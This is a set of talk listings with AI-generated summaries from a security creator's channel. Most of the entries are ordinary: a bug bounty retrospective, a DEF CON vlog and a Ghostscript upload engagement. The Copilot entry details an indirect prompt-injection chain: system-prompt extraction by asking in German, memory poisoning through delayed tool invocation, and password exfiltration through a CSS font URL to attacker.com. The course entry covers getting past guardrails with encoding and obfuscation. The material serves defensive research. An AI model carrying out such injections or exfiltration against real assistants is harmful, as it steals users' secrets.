talks.summary:
Overview: A veteran bug bounty hunter analyzes 12 years and 1,500 HackerOne reports using Claude AI, revealing uncomfortable truths about duplicates, evolving bug classes, and reports that go nowhere.

Key Topics: 1,500 reports across 228 programs from 2014-2025; duplicate rates rising from 19% to 27%; 561 reports with no bounty; and the gap between public profiles and actual outcomes.

Technical Details: The speaker fed all reports to Claude for classification, discovering his signature bug class stopped yielding results years ago while simpler bugs paid more frequently. One in five reports were duplicates throughout his career.

Takeaways: Bug bounty success metrics hide significant failure rates. Even experienced hunters face persistent duplicate challenges, and the bugs you're known for may not be the bugs that pay.

talks.title: This Word Document Steals Your Password From Microsoft Copilot (+ LIVE DEMO)
talks.teaser: This Word Document Steals Your Password From Microsoft Copilot (+ LIVE DEMO).
talks.summary: Overview: Prominent AI security researcher Johann Rehberger ("wunderwuzzi") joins host Ben Sadeghipour (@NahamSec) to demonstrate a persistent data exfiltration attack targeting Microsoft 365 Copilot. Rehberger explains how an adversary can weaponize a standard Word document or email to execute indirect prompt injection, poison Copilot’s long-term memory, and establish persistent data-stealing triggers across future sessions. The researchers present a live demonstration showing how an injected payload uses delayed tool invocation and a universal Content Security Policy (CSP) font-loading bypass to steal user secrets without macros or malicious links. Key Topics: - Microsoft 365 Copilot architecture and persistent memory attack surface - Indirect prompt injection via Word document summarization - Delayed tool invocation for reliable memory persistence - Universal Content Security Policy (CSP) bypass via CSS font rendering Technical Details: The attack targets the "lethal trifecta" in enterprise Large Language Model (LLM) agents: access to private user data, processing of untrusted external content, and the capability to initiate outbound communications. Rehberger audited enterprise Microsoft 365 Copilot—spanning Word, Excel, PowerPoint, SharePoint Online, and the Windows desktop app. During reconnaissance, he extracted Copilot's system prompt by requesting it in German (bypassing English refusal guardrails) and mapped available internal tools by instructing the model to format tool definitions within an XML document. This revealed key system tools, including `record_memory` (which manages persistent user memory) and `create_text_document` (which renders interactive artifact content). To exploit the system, the attacker distributes an ordinary Word document containing indirect prompt injection instructions. When the victim clicks Copilot's native "Summarize" button, the model processes the text. To bypass guardrails that prevent direct memory poisoning, Rehberger developed a "delayed tool invocation" technique: the prompt forces Copilot to append an engaging follow-up prompt (e.g., asking if information about Albert Einstein was helpful). Any affirmative or conversational response from the user satisfies the agent's intent requirement, causing Copilot to execute `record_memory` and inject persistent instructions into the user’s long-term profile. The stored memory payload instructs Copilot that whenever the user discusses sensitive topics—such as passwords, API keys, or proprietary code—in any future session across Word, Excel, or SharePoint, it must silently generate an artifact HTML document containing an external CSS stylesheet. While Microsoft implemented filters and strict CSP rules blocking `` tags and markdown images across various M365 subdomains, remote CSS font loading (`@font-face { src: url('https://attacker.com/leak?data=...') }`) was universally permitted across all Copilot interfaces. The injected prompt commands Copilot to automatically switch the artifact view from code to live preview, silently triggering the external HTTP request to fetch the font and exfiltrating the victim's plaintext password to the attacker's server. Key Takeaways: Enterprise AI deployments must treat long-term memory storage as a high-risk persistence layer requiring explicit user confirmation before recording instructions. Applications must enforce strict egress network boundaries and comprehensive Content Security Policies that restrict all outbound resource loading, including fonts and stylesheets. Security teams must account for indirect prompt injection in document summarization workflows, recognizing that data exfiltration can occur without traditional macros, executable downloads, or user link clicks. (AI summary — Gemini Flash)

talks.title: I Went to the World's Biggest Hacker Conference (DEFCON VLOG)
talks.teaser: I Went to the World's Biggest Hacker Conference (DEFCON VLOG).
talks.summary:
Overview:
Security researcher and content creator Ben Sadeghipour (NahamSec) documents his experiences navigating DEF CON in Las Vegas in an experiential conference vlog. Through behind-the-scenes footage and informal technical discussions, Sadeghipour captures the community dynamics, village presentations, and competitive challenges that define the conference. The vlog highlights activities across the Bug Bounty Village and Red Team Village, offering practical commentary on hardware CTFs, the impact of artificial intelligence on offensive security, and the growing problem of low-quality, unvalidated vulnerability reporting.

Key Topics:
- Community engagement and technical activities across DEF CON villages (Bug Bounty Village, Red Team Village)
- Hardware badge architecture featuring custom printed circuit boards (PCBs) and integrated CTF puzzle challenges
- Examining the operational impact of AI on red teaming workflows and offensive automation
- Industry perspectives on bug bounty report hygiene, automated scanner noise, and threat model validation

Technical Details:
Sadeghipour provides a first-hand view into the operational infrastructure of DEF CON's specialized villages. At the Bug Bounty Village, organizers unveiled a custom hardware badge engineered as an independent challenge platform. The PCB was designed with embedded firmware running localized Capture The Flag (CTF) challenges, requiring attendees to solve cryptographic puzzles, inspect onboard memory, and manipulate logic gates via physical input buttons to extract sequential flag strings (e.g., binary bit toggling) directly linked to the broader village competition.

Beyond community events, Sadeghipour participates in an opening panel at the Red Team Village alongside fellow practitioners (Ads, Ryan, and Bill), debating whether generative artificial intelligence and large language models represent a terminal threat to traditional offensive red teaming. The panel emphasizes that while automated tooling accelerates routine reconnaissance and script generation, human intuition, complex multi-step pivoting, and deep contextual reasoning remain indispensable for enterprise compromise. Shifting to vulnerability disclosure, Sadeghipour interviews bug bounty triage engineers and program managers regarding submission quality. The interviewees voice significant frustration over the surge in low-quality reports generated by automated scanners (such as Burp Suite web vulnerability scanner false positives) and unverified AI prompts. They highlight that submitters frequently claim critical impacts for unexploitable informational findings without understanding underlying application threat models or validating reproducible impact, generating severe operational friction and draining triage resources.

Key Takeaways:
Hands-on hardware badges and village CTF challenges remain vital educational platforms for developing practical reverse engineering and firmware manipulation skills. In offensive security and red teaming, practitioners must view artificial intelligence as an efficiency multiplier rather than a replacement for contextual adversary emulation and creative problem solving. Finally, security researchers participating in bug bounty programs must rigorously validate proof-of-concepts and contextualize business impact prior to submission, avoiding automated report spam that undermines researcher-triage relationships.

(AI summary — Gemini Flash)

talks.teaser: Free AI Hacking Course: Indirect Prompt Injection (+FREE LABS).
talks.summary:
Core concept

NahamSec and Mike Toxic frame indirect prompt injection as planting instructions in attacker-controlled content—email, websites, PDFs, repos, calendar invites—that a victim's AI agent later reads and executes, enabling realistic external-attacker bug-bounty scenarios.

Guardrails

Many testers stop after basic payloads hit input/output filters; the course focuses on bypassing both with framing, obfuscation, and encoding to turn refusals into working exploits.

Lab design

Free HackingHub labs recreate a $3,000 bounty pattern: exfiltrating a password-reset token from a victim inbox via an AI connector, with three escalating levels adding stronger models and dual guardrails.

Delivery vectors

Common realistic paths include website summarization, file uploads, code/README comments, and any connector ingesting external content. Payload complexity varies by model capability and how external tool output is delimited inside the giant system prompt.

talks.title: How One File Upload Got Me the Entire Customer Database
talks.teaser: How One File Upload Got Me the Entire Customer Database.
talks.summary:
## Overview
A NahamSec walkthrough of a real engagement where a single malicious file upload through an image-to-PDF conversion pipeline led to full customer database access.

## Recon and Target Selection
Hired to reach crown-jewel data—not checkbox scanning—the tester mapped inputs and focused on upload features that pipe files through Ghostscript or similar converters, a recurring weak point.

## AI-Assisted Exploitation
ChatGPT helped enumerate recent Ghostscript CVEs with public POCs from the past three years. The presenter automated uploading crafted PDFs across entry points until one payload yielded a shell.

## Takeaways
File-conversion microservices are high-value targets. Combine manual app mapping with AI-assisted CVE research, but validate exploits hands-on—many payloads fail before one grants initial access.
